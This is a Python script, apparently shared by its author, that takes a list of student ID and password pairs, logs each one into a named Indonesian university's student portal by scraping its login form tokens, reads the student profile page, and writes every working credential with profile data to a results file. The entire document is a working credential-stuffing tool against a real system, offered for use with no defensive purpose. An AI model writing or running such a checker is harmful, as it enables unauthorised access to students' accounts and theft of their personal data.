# Code by YutixCode
import requests as req
from bs4 import BeautifulSoup as bs
print('isi list nim:pwd')
file = input('Filepath: ')
try:
    with open(file, 'r') as wl:
        lines = wl.readlines()
        num = 0
        for id in lines:
            num += 1
            usr = id.split(':')[0]
            pwd = id.split(':')[1]
            url = 'https://siatma.uajy.ac.id/Index.aspx'
            res = req.Session()
            raw = res.get(url).text
            gas = bs(raw, 'html.parser').findAll('input')
            vs1 = gas[0]['value']
            vs2 = gas[1]['value']
            evr = gas[2]['value']
            dat = { "__VIEWSTATE": vs1,
                   "__VIEWSTATEGENERATOR": vs2,
                   "__EVENTVALIDATION": evr,
                   "txtUsername": usr.strip(),
                   "txtPassword": pwd.strip(),
                   "btnLogin": "submit" }
            rsp = res.post(url, data=dat).text
            inf = res.get('https://siatma.uajy.ac.id/View/ProfilMahasiswa.aspx').text
            try:
                arn = bs(inf, 'html.parser').findAll('tr')[3].findAll('span')[1]
                print(f'\033[97m{num}] \033[92m{usr.strip()}:{pwd.strip()}\033[97m>\033[92m {arn.get_text()}')
                with open('hasil.txt', 'a') as ok:
                    ok.write(f'{usr.strip()}:{pwd.strip()} > {arn.get_text()}\n')
                    ok.close()
            except:
                print(f'\033[97m{num}] \033[91m{usr.strip()}:{pwd.strip()} \033[97m>\033[91m Error')
        exit('\033[96m\nData berhasil disimpan')
except Exception as er:
    print(f'\033[91m{er}')
